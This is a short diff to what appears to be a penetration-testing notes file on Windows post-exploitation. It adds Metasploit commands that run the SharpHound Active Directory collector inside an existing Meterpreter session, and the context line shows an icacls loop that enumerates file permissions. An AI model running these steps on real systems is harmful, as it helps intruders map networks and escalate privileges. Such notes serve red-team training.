@@ -58,7 +58,22 @@ for /F %A in (C:\temp\icacls.txt) do ( cmd.exe /c icacls "%~A" 2>nul | findstr /
 
 
 
-##  Via God-Tier Meterpreter's Post Exploit Module Execute dotner Assembly
+##  Via God-Tier Meterpreter's Post Exploit Module Execute dotnet Assembly
 
 https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/execute_dotnet_assembly.md
+
+```
+set SESSION 1
+
+set DOTNET_EXEC <path to the exe you want executed>
+
+set ARGUMENTS <the flags and commands you will pass to the DOTNET_EXEC>
+
+# For example, if i want to run sharphound.exe
+
+set DOTNET_EXEC ./SharpHound.exe
+
+set ARGUMENTS -c ALL --outputdirectory C:\Users\Public
+```
+
 
